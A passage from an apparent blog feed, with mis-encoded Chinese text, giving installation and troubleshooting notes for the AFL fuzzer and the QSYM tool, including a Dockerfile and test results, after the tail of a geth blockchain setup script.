class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node2/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;puppeth &amp;lt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node1 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node2 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node1/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node2/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -genkey boot.key&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -nodekey boot.key -addr :30305&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹&quot;&gt;&lt;a href=&quot;#ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹&quot; class=&quot;headerlink&quot; title=&quot;ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹&quot;&gt;&lt;/a&gt;ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹&lt;/h3&gt;</summary>
    
    
    
    <category term="misc" scheme="https://jingtianer.github.io/home/categories/misc/"/>
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/tags/linux/"/>
    
    <category term="geth" scheme="https://jingtianer.github.io/home/tags/geth/"/>
    
    <category term="blockchain" scheme="https://jingtianer.github.io/home/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>QSYM-afl-ç¯å¢ƒå®‰è£…</title>
    <link href="https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <id>https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</id>
    <published>2023-01-07T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="aflçš„å®‰è£…"><a href="#aflçš„å®‰è£…" class="headerlink" title="aflçš„å®‰è£…"></a>aflçš„å®‰è£…</h2><ul><li>å®‰è£…<code>build-essentials</code>å’Œ<code>cmake</code></li><li>githubä¸‹è½½æºç å¹¶è§£å‹</li><li><code>make</code></li><li><code>make install</code></li></ul><p><code>usr/local/bin</code>ä¸‹æœ‰äº†ç¼–è¯‘å¥½çš„aflå·¥å…·</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@tt-HP:~/dns_env<span class="comment"># find /usr/local/bin/afl*</span></span><br><span class="line">/usr/local/bin/afl-analyze</span><br><span class="line">/usr/local/bin/afl-clang</span><br><span class="line">/usr/local/bin/afl-clang++</span><br><span class="line">/usr/local/bin/afl-cmin</span><br><span class="line">/usr/local/bin/afl-fuzz</span><br><span class="line">/usr/local/bin/afl-g++</span><br><span class="line">/usr/local/bin/afl-gcc</span><br><span class="line">/usr/local/bin/afl-gotcpu</span><br><span class="line">/usr/local/bin/afl-plot</span><br><span class="line">/usr/local/bin/afl-showmap</span><br><span class="line">/usr/local/bin/afl-tmin</span><br><span class="line">/usr/local/bin/afl-whatsup</span><br></pre></td></tr></table></figure><h2 id="qsymçš„å®‰è£…"><a href="#qsymçš„å®‰è£…" class="headerlink" title="qsymçš„å®‰è£…"></a>qsymçš„å®‰è£…</h2><ul><li>ä»¥ä¸‹æ˜¯å®‰è£…æ–¹æ³•<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># install z3 and system deps</span></span><br><span class="line">$ ./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># install using virtual env</span></span><br><span class="line">$ virtualenv venv</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line">$ pip install .</span><br></pre></td></tr></table></figure><blockquote><p>ä¸ç”¨wslç”¨vmå°±ä¸ä¼šæœ‰å¾ˆå¤šé—®é¢˜</p></blockquote></li></ul><h3 id="ptraceç½®0"><a href="#ptraceç½®0" class="headerlink" title="ptraceç½®0"></a>ptraceç½®0</h3><p>å¯èƒ½æ˜¯ç”±äºå†…æ ¸ç‰ˆæœ¬é—®é¢˜ï¼Œ<code>/proc/sys/kernel/yama/ptrace_scope</code>æ–‡ä»¶ä¸å­˜åœ¨ï¼ŒæŸ¥åˆ°å¯ä»¥ä¿®æ”¹å¦ä¸€ä¸ªæ–‡ä»¶ <code>/etc/sysctl.d/10-ptrace.conf</code>ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹å†…å®¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.yama.ptrace_scope = 0</span><br></pre></td></tr></table></figure><p>åœ¨<code>setup.sh</code>ä¸­ä¼šå¯¹è¿™ä¸ª<code>/proc/sys/kernel/yama/ptrace_scope</code>æ–‡ä»¶ä¸­çš„å€¼æ˜¯å¦ä¸º0è¿›è¡Œåˆ¤æ–­ï¼Œç”±äºæˆ‘æ²¡æœ‰ï¼Œå°†è„šæœ¬ä¸­è¿™å‡ è¡Œåˆ æ‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="å­æ¨¡å—ä¸‹è½½é—®é¢˜"><a href="#å­æ¨¡å—ä¸‹è½½é—®é¢˜" class="headerlink" title="å­æ¨¡å—ä¸‹è½½é—®é¢˜"></a>å­æ¨¡å—ä¸‹è½½é—®é¢˜</h3><p>å®‰è£…è¿‡ç¨‹ä¸­å‘ç°<code>git submodule</code>ä¸‹è½½ä¸ä¸‹æ¥ï¼Œä½¿ç”¨é€’å½’çš„æ–¹å¼é‡æ–°clone</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sslab-gatech/qsym.git --recursive</span><br></pre></td></tr></table></figure><p>åœ¨<code>setup.sh</code>æŠŠgit submodule å»æ‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure><h3 id="é…ç½®PYTHONç¯å¢ƒå˜é‡"><a href="#é…ç½®PYTHONç¯å¢ƒå˜é‡" class="headerlink" title="é…ç½®PYTHONç¯å¢ƒå˜é‡"></a>é…ç½®PYTHONç¯å¢ƒå˜é‡</h3><p>è§‚å¯Ÿåˆ°setup.shä¸­ï¼Œget-pipæ—¶éœ€è¦ä½¿ç”¨python2ç¯å¢ƒï¼Œæç¤ºéœ€è¦<code>PYTHONç¯å¢ƒå˜é‡</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">export</span> PYTHON=$(<span class="built_in">echo</span> $(whereis python2) | awk <span class="string">&#x27;&#123;split($0, arr, &quot; &quot;); print arr[2]&#125;&#x27;</span>) | <span class="built_in">tee</span> -a ~/.bashrc </span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="æ‰¾ä¸åˆ°bits-h"><a href="#æ‰¾ä¸åˆ°bits-h" class="headerlink" title="æ‰¾ä¸åˆ°bits/*.h"></a>æ‰¾ä¸åˆ°<code>bits/*.h</code></h3><ul><li>å®‰è£…multilib<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/test</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y g++-multilib</span><br></pre></td></tr></table></figure></li></ul><h3 id="å®‰è£…virtualenv"><a href="#å®‰è£…virtualenv" class="headerlink" title="å®‰è£…virtualenv"></a>å®‰è£…virtualenv</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install virtualenv</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…lsb"><a href="#å®‰è£…lsb" class="headerlink" title="å®‰è£…lsb"></a>å®‰è£…lsb</h3><ul><li>è¿›è¡Œ<code>pip install .</code>æ—¶å¯èƒ½æŠ¥é”™<code>make: lsb_release: Command not found</code>ï¼Œå®‰è£…lsbæ—¢å¯</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lsb-core</span><br></pre></td></tr></table></figure><blockquote><p>æœ€ç»ˆåœ¨vmçš„ubuntu 16.04ä¸‹æˆåŠŸè¿›è¡Œäº†å®‰è£…ï¼Œpythonç¯å¢ƒæ˜¯python3.7.9ï¼ˆubuntu 16.04éœ€è¦ä¸‹è½½python3.7æºç ç¼–è¯‘å®‰è£…ï¼‰ï¼ˆpython2ç¯å¢ƒä¹ŸæˆåŠŸäº†ï¼Œå…¶å®ä¸åº”è¯¥å®‰è£…python3ï¼Œæ•´ä¸ªé¡¹ç›®éƒ½åº”è¯¥è¿è¡Œåœ¨python2ç¯å¢ƒä¸‹ï¼‰</p></blockquote><h3 id="è¿è¡Œæµ‹è¯•"><a href="#è¿è¡Œæµ‹è¯•" class="headerlink" title="è¿è¡Œæµ‹è¯•"></a>è¿è¡Œæµ‹è¯•</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tests</span><br><span class="line">python build.py</span><br><span class="line">python -m pytest -n $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure><ul><li><p>requirements</p><ul><li><code>pip install python-afl</code></li></ul></li><li><p>è¿è¡Œç»“æœ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/qsym/tests$ python -m pytest -n $(<span class="built_in">nproc</span>)</span><br><span class="line">============================= <span class="built_in">test</span> session starts ==============================</span><br><span class="line">platform linux2 -- Python 2.7.12, pytest-4.6.11, py-1.11.0, pluggy-0.13.1</span><br><span class="line">rootdir: /home/tt/Desktop/dns/qsym</span><br><span class="line">plugins: forked-1.3.0, xdist-1.34.0</span><br><span class="line">gw0 [250] / gw1 [250] / gw2 [250] / gw3 [250]</span><br><span class="line">........................................................................ [ 28%]</span><br><span class="line">........................................................................ [ 57%]</span><br><span class="line">........................................................................ [ 86%]</span><br><span class="line">..................................                                                                                                                                                                   [100%]</span><br><span class="line">======================================================================================= 250 passed <span class="keyword">in</span> 565.71 seconds =======================================================================================</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä½¿ç”¨dockerå®‰è£…qsym"><a href="#ä½¿ç”¨dockerå®‰è£…qsym" class="headerlink" title="ä½¿ç”¨dockerå®‰è£…qsym"></a>ä½¿ç”¨dockerå®‰è£…qsym</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># build docker image</span></span><br><span class="line">$ docker build -t qsym ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># run docker image</span></span><br><span class="line">$ docker run --cap-add=SYS_PTRACE -it qsym /bin/bash</span><br></pre></td></tr></table></figure><h3 id="é”™è¯¯1"><a href="#é”™è¯¯1" class="headerlink" title="é”™è¯¯1"></a>é”™è¯¯1</h3><ul><li>ERROR [internal] load metadata for docker.io&#x2F;library&#x2F;ubuntu:16.04</li></ul><p>åœ¨dockerä¸­çš„<code>daemon.json</code>ä¸­ä¿®æ”¹buildkitä¸ºfalse</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;buildkit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ptraceç½®0-1"><a href="#ptraceç½®0-1" class="headerlink" title="ptraceç½®0"></a>ptraceç½®0</h3><ul><li>ä½¿ç”¨dockeræ—¶ï¼Œbuildæ—¶çš„ubuntué•œåƒä¹Ÿæ²¡æœ‰è¿™ä¸ª<code>/proc/sys/kernel/yama/ptrace_scope</code>æ–‡ä»¶ã€‚setup.shä¸­å°†è„šæœ¬ä¸­è¿™å‡ è¡Œåˆ æ‰<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="æœ€ç»ˆçš„dockerfile"><a href="#æœ€ç»ˆçš„dockerfile" class="headerlink" title="æœ€ç»ˆçš„dockerfile"></a>æœ€ç»ˆçš„dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jingtianer: å›½å†…æº</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git build-essential sudo python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y lsb-core</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y libc6 libstdc++6 linux-libc-dev gcc-multilib g++-multilib \</span></span><br><span class="line"><span class="language-bash">  llvm-dev g++ g++-multilib python \</span></span><br><span class="line"><span class="language-bash">  lsb-release</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y gcc make python-pip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /workdir/qsym</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># jingtianer: pipæ¸…åæº</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN echo kernel.yama.ptrace_scope = 0 | sudo tee /etc/sysctl.d/10-ptrace.conf</span></span><br><span class="line"><span class="comment"># jingtianer: ptraceç½®ä¸º0</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install python-afl</span></span><br><span class="line"><span class="comment"># jingtianer: testéœ€è¦çš„ä¾èµ–åŒ…</span></span><br></pre></td></tr></table></figure><blockquote><p>docker æ–¹å¼åœ¨ubuntu22.04ä¸­é…ç½®å®‰è£…ï¼Œä½†æ˜¯ä¸èƒ½æˆåŠŸè¿è¡Œæµ‹è¯•ä»£ç </p></blockquote><blockquote><p>ä¸¤ç§æ–¹æ³•éƒ½æ— æ³•åœ¨wslä¸­ä½¿ç”¨ï¼Œç¼ºå°‘æ–‡ä»¶å¤¹<code>/proc/sys/kernel/yama</code><br>ä¸¤ç§æ–¹æ³•åœ¨ç¼–è¯‘æ—¶éƒ½å­˜åœ¨warnings</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;aflçš„å®‰è£…&quot;&gt;&lt;a href=&quot;#aflçš„å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;aflçš„å®‰è£…&quot;&gt;&lt;/a&gt;aflçš„å®‰è£…&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;å®‰è£…&lt;code&gt;build-essentials&lt;/code&gt;å’Œ&lt;code&gt;cmake&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;githubä¸‹è½½æºç å¹¶è§£å‹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;usr/local/bin&lt;/code&gt;ä¸‹æœ‰äº†ç¼–è¯‘å¥½çš„aflå·¥å…·&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@tt-HP:~/dns_env&lt;span class=&quot;comment&quot;&gt;# find /usr/local/bin/afl*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-analyze&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-cmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-fuzz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-g++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gotcpu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-plot&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-showmap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-tmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-whatsup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;qsymçš„å®‰è£…&quot;&gt;&lt;a href=&quot;#qsymçš„å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;qsymçš„å®‰è£…&quot;&gt;&lt;/a&gt;qsymçš„å®‰è£…&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ä»¥ä¸‹æ˜¯å®‰è£…æ–¹æ³•&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# disable ptrace_scope for PIN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; 0|sudo &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; /proc/sys/kernel/yama/ptrace_scope&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install z3 and system deps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install using virtual env&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ virtualenv venv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; venv/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ pip install .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸ç”¨wslç”¨vmå°±ä¸ä¼šæœ‰å¾ˆå¤šé—®é¢˜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
